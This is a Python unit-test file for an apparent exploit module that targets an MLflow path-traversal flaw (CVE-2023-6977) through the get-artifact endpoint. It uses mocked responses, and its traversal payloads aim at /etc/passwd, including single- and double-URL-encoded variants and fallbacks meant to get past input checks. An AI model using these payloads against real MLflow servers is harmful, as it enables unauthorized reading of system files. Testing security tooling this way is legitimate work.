"""Tests for flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977."""

from unittest.mock import MagicMock, patch

from flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977 import (
    Auxiliary,
    _encode_variants,
)

_BASE_URL = "http://localhost:5000"
_AUTH_HEADERS = {
    "Authorization": "Basic YWRtaW46c2VjcmV0",
    "Content-Type": "application/json",
}


def _mock_auth_get(status: int = 200):
    resp = MagicMock()
    resp.status_code = status
    return resp


# ---------------------------------------------------------------------------
# Shared response factories
# ---------------------------------------------------------------------------


def _make_auth_resp():
    resp = MagicMock()
    resp.status_code = 200
    return resp


def _make_models_resp(model_name: str = "my_model"):
    resp = MagicMock()
    resp.status_code = 200
    resp.json.return_value = {"registered_models": [{"name": model_name}]}
    return resp


def _make_versions_resp(version: str = "1"):
    resp = MagicMock()
    resp.status_code = 200
    resp.json.return_value = {"model_versions": [{"version": version}]}
    return resp


def _make_traversal_resp(status: int = 200, text: str = "root:x:0:0"):
    resp = MagicMock()
    resp.status_code = status
    resp.text = text
    return resp


# ---------------------------------------------------------------------------
# _encode_variants
# ---------------------------------------------------------------------------


class TestEncodeVariants:
    def test_returns_three_variants(self):
        variants = _encode_variants("../../etc/passwd")
        assert len(variants) == 3

    def test_first_variant_is_single_encoded(self):
        variants = _encode_variants("../../etc/passwd")
        assert "..%2F" in variants[0]
        assert "../" not in variants[0]

    def test_second_variant_is_double_encoded(self):
        variants = _encode_variants("../../etc/passwd")
        assert "..%252F" in variants[1]

    def test_third_variant_is_raw(self):
        variants = _encode_variants("../../etc/passwd")
        assert variants[2] == "../../etc/passwd"


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


def _make_400_resp():
    r = MagicMock()
    r.status_code = 400
    r.text = '{"error_code": "INVALID_PARAMETER_VALUE", "message": "Invalid path"}'
    return r


def _make_404_resp():
    r = MagicMock()
    r.status_code = 404
    r.text = "not found"
    return r


class TestTriggerVuln:
    def test_returns_tuple_on_200(self):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "file body"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=mock_resp,
        ):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result == (200, "file body")

    def test_first_attempt_uses_single_encoded_path(self):
        """First request must use the %2F-encoded path, not raw '../'."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "data"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=mock_resp,
        ) as mock_get:
            exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        first_url = mock_get.call_args_list[0][0][0]
        assert "../" not in first_url
        assert "..%2F" in first_url

    def test_primary_endpoint_is_rest_api(self):
        """The first endpoint tried must be the canonical REST API path."""
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.text = "data"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=mock_resp,
        ) as mock_get:
            exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        first_url = mock_get.call_args_list[0][0][0]
        assert "/api/2.0/mlflow/model-versions/get-artifact" in first_url

    def test_skips_400_invalid_parameter_and_tries_next_variant(self):
        """A 400 INVALID_PARAMETER_VALUE response causes the next encoding variant
        to be tried on the same endpoint."""
        bad = _make_400_resp()
        good = MagicMock()
        good.status_code = 200
        good.text = "root:x:0:0"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=[bad, good],
        ) as mock_get:
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result == (200, "root:x:0:0")
        assert mock_get.call_count == 2

    def test_skips_404_endpoint_and_tries_next_endpoint(self):
        """A 404 on one endpoint should break the inner variant loop and move to
        the next endpoint."""
        not_found = _make_404_resp()
        good = MagicMock()
        good.status_code = 200
        good.text = "uid=0"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=[not_found, good],
        ) as mock_get:
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result == (200, "uid=0")
        # First call is the 404 endpoint, second call is the next endpoint.
        assert mock_get.call_count == 2
        first_url = mock_get.call_args_list[0][0][0]
        second_url = mock_get.call_args_list[1][0][0]
        assert first_url != second_url

    def test_network_error_returns_none(self):
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=ConnectionError("refused"),
        ):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result is None

    def test_skips_500_and_tries_next_variant(self):
        """A 500 response means the encoded path was passed literally to the
        filesystem (e.g. the file '..%2F...' does not exist).  The next variant
        (raw '../') must be tried."""
        server_error = MagicMock()
        server_error.status_code = 500
        server_error.text = "<h1>Internal Server Error</h1>"

        good = MagicMock()
        good.status_code = 200
        good.text = "root:x:0:0:root:/root:/bin/bash"

        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=[server_error, good],
        ) as mock_get:
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result == (200, "root:x:0:0:root:/root:/bin/bash")
        assert mock_get.call_count == 2
        # First call used encoded path, second used a different variant
        first_url = mock_get.call_args_list[0][0][0]
        second_url = mock_get.call_args_list[1][0][0]
        assert first_url != second_url

    def test_all_variants_exhausted_returns_last_resp(self):
        """When every variant is skipped (400/500), the last (status, body) is returned."""
        bad = _make_400_resp()

        exploit = Auxiliary()
        # 3 variants × 3 endpoints = 9 calls, all 400
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=bad,
        ):
            result = exploit.trigger_vuln(
                base_url=_BASE_URL,
                headers=_AUTH_HEADERS,
                model_name="my_model",
                version="1",
                path="../../../../etc/passwd",
            )

        assert result == (400, bad.text)


# ---------------------------------------------------------------------------
# _list_registered_models
# ---------------------------------------------------------------------------


class TestListRegisteredModels:
    def test_network_error_returns_empty(self):
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=ConnectionError("refused"),
        ):
            assert (
                exploit._list_registered_models(
                    base_url=_BASE_URL, headers=_AUTH_HEADERS
                )
                == []
            )

    def test_non_200_returns_empty(self):
        resp = MagicMock()
        resp.status_code = 403
        resp.json.return_value = {"error": "forbidden"}
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=resp,
        ):
            assert (
                exploit._list_registered_models(
                    base_url=_BASE_URL, headers=_AUTH_HEADERS
                )
                == []
            )

    def test_filters_unnamed_entries(self):
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {
            "registered_models": [{"name": "valid"}, {}, {"name": ""}]
        }
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=resp,
        ):
            assert exploit._list_registered_models(
                base_url=_BASE_URL, headers=_AUTH_HEADERS
            ) == ["valid"]


# ---------------------------------------------------------------------------
# _list_model_versions
# ---------------------------------------------------------------------------


class TestListModelVersions:
    def test_network_error_returns_empty(self):
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            side_effect=ConnectionError("refused"),
        ):
            assert (
                exploit._list_model_versions(
                    base_url=_BASE_URL, headers=_AUTH_HEADERS, model_name="my_model"
                )
                == []
            )

    def test_non_200_returns_empty(self):
        resp = MagicMock()
        resp.status_code = 404
        resp.json.return_value = {"error": "not found"}
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=resp,
        ):
            assert (
                exploit._list_model_versions(
                    base_url=_BASE_URL, headers=_AUTH_HEADERS, model_name="my_model"
                )
                == []
            )

    def test_filters_versionless_entries(self):
        resp = MagicMock()
        resp.status_code = 200
        resp.json.return_value = {
            "model_versions": [{"version": "1"}, {}, {"version": ""}]
        }
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
            return_value=resp,
        ):
            assert exploit._list_model_versions(
                base_url=_BASE_URL, headers=_AUTH_HEADERS, model_name="my_model"
            ) == ["1"]


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------


class TestRun:
    def test_successful_traversal(self):
        auth_resp = _make_auth_resp()
        models_resp = _make_models_resp()
        versions_resp = _make_versions_resp()
        traversal_resp = _make_traversal_resp(200, "root:x:0:0:root:/root:/bin/bash")

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get",
                return_value=auth_resp,
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, versions_resp, traversal_resp],
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="secret"
            )

        assert result is True

    def test_no_registered_models_returns_false(self):
        auth_resp = _make_auth_resp()
        no_models_resp = MagicMock()
        no_models_resp.status_code = 200
        no_models_resp.json.return_value = {"registered_models": []}

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                return_value=no_models_resp,
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="secret"
            )

        assert result is False

    def test_auth_failure_returns_false(self):
        exploit = Auxiliary()
        with patch(
            "flowhound.vulnerabilities.clients.mlflow.get",
            return_value=_mock_auth_get(401),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="wrongpass"
            )

        assert result is False

    def test_patched_server_returns_false(self):
        """403 on every traversal attempt → False."""
        auth_resp = _make_auth_resp()
        models_resp = _make_models_resp()
        versions_resp = _make_versions_resp()
        denied = _make_traversal_resp(status=403, text="")

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, versions_resp] + [denied] * 10,
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="secret"
            )

        assert result is False

    def test_skips_model_with_no_versions(self):
        """When a model has no versions the loop continues to the next model."""
        auth_resp = _make_auth_resp()
        models_resp = MagicMock()
        models_resp.status_code = 200
        models_resp.json.return_value = {
            "registered_models": [{"name": "no_ver"}, {"name": "has_ver"}]
        }
        no_ver_resp = MagicMock()
        no_ver_resp.status_code = 200
        no_ver_resp.json.return_value = {"model_versions": []}
        ver_resp = MagicMock()
        ver_resp.status_code = 200
        ver_resp.json.return_value = {"model_versions": [{"version": "2"}]}
        traversal_resp = MagicMock()
        traversal_resp.status_code = 200
        traversal_resp.text = "root:x:0:0"

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, no_ver_resp, ver_resp, traversal_resp],
            ),
        ):
            assert (
                exploit.run(base_url=_BASE_URL, username="admin", password="secret")
                is True
            )

    def test_trigger_none_continues_to_next_model(self):
        """trigger_vuln returning None (network error) continues to next model."""
        auth_resp = _make_auth_resp()
        models_resp = MagicMock()
        models_resp.status_code = 200
        models_resp.json.return_value = {
            "registered_models": [{"name": "m1"}, {"name": "m2"}]
        }
        ver_resp1 = MagicMock()
        ver_resp1.status_code = 200
        ver_resp1.json.return_value = {"model_versions": [{"version": "1"}]}
        ver_resp2 = MagicMock()
        ver_resp2.status_code = 200
        ver_resp2.json.return_value = {"model_versions": [{"version": "1"}]}
        traversal_ok = MagicMock()
        traversal_ok.status_code = 200
        traversal_ok.text = "uid=0"

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[
                    models_resp,
                    ver_resp1,
                    ConnectionError("refused"),
                    ver_resp2,
                    traversal_ok,
                ],
            ),
        ):
            assert (
                exploit.run(base_url=_BASE_URL, username="admin", password="secret")
                is True
            )

    def test_custom_f_path_used(self):
        """When f_path is provided, it is encoded and embedded in the request URL."""
        auth_resp = _make_auth_resp()
        models_resp = _make_models_resp()
        versions_resp = _make_versions_resp()
        traversal_resp = _make_traversal_resp(200, "root:x:0:0")

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, versions_resp, traversal_resp],
            ) as mock_get,
        ):
            assert (
                exploit.run(
                    base_url=_BASE_URL,
                    username="admin",
                    password="secret",
                    f_path="../../../custom/path",
                )
                is True
            )
            # The first two calls are model/version listing; all subsequent calls
            # are trigger_vuln attempts.  Find the first artifact endpoint call.
            artifact_urls = [
                c[0][0]
                for c in mock_get.call_args_list[2:]
                if "get-artifact" in c[0][0]
            ]
            assert artifact_urls, "No get-artifact call found"
            first_artifact_url = artifact_urls[0]
            assert "..%2F" in first_artifact_url
            assert "custom" in first_artifact_url

    def test_mlflow_error_envelope_is_not_success(self):
        """A 200 response with '{}' (MLflow empty envelope) is treated as failure."""
        auth_resp = _make_auth_resp()
        models_resp = _make_models_resp()
        versions_resp = _make_versions_resp()
        envelope_resp = _make_traversal_resp(200, "{}")

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, versions_resp, envelope_resp],
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="secret"
            )

        assert result is False

    def test_empty_body_is_success(self):
        """A 200 response with an empty body is a successful read."""
        auth_resp = _make_auth_resp()
        models_resp = _make_models_resp()
        versions_resp = _make_versions_resp()
        empty_resp = _make_traversal_resp(200, "")

        exploit = Auxiliary()
        with (
            patch(
                "flowhound.vulnerabilities.clients.mlflow.get", return_value=auth_resp
            ),
            patch(
                "flowhound.vulnerabilities.auxiliary.mlflow.cve_2023_6977.get",
                side_effect=[models_resp, versions_resp, empty_resp],
            ),
        ):
            result = exploit.run(
                base_url=_BASE_URL, username="admin", password="secret"
            )

        assert result is True
